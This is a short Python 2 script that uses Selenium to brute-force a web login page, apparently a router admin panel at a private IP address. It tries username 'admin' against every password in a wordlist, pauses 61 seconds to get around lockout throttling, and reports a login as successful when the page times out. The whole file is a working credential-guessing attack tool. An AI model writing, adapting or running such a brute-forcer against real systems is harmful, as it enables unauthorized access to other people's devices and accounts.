#!/usr/bin/env python2

import os
import time
import ConfigParser
import selenium.webdriver as webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import ElementNotInteractableException
from selenium.webdriver.support import expected_conditions as EC
from termcolor import colored

current_path = os.getcwd()
config = ConfigParser.ConfigParser()
config.read(current_path + '/config.cfg')
username_form_id = config.get('form_id', 'username')
password_form_id = config.get('form_id', 'password')
submit_form_id = config.get('form_id', 'submit')
word_list = config.get('word_list', 'file')

password_list = []
# path = ("/home/hassan/Dropbox/development/projects/resources/wordlists/rockyou.txt")
path = current_path + "/" + "common.txt"


def send_data(word_password):

    element = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, password_form_id)))
    username = driver.find_element_by_id(username_form_id)
    password = driver.find_element_by_id(password_form_id)
    login_button = driver.find_element_by_id(submit_form_id)

    username.send_keys("admin")
    password.send_keys(word_password)
    login_button.click()

    # If the pass is wrong
    # element = WebDriverWait(driver, 5).until(EC.alert_is_present())
    # alert = driver.switch_to_alert()
    # alert.accept()
    print(colored('[Failed]\t', 'red') + each_password)


the_file = open(path, "r")
for n in the_file:
    password_list.append(n.rstrip())
the_file.close()


driver = webdriver.Firefox()
driver.get("http://192.168.100.1")


for i, each_password in enumerate(password_list):

    try:
        send_data(each_password)

    except ElementNotInteractableException:
        print "next is " + each_password
        time.sleep(61)
        send_data(each_password)

    except TimeoutException:
        print(colored('[Success]\t', 'green') + each_password)
        driver.quit()
        break
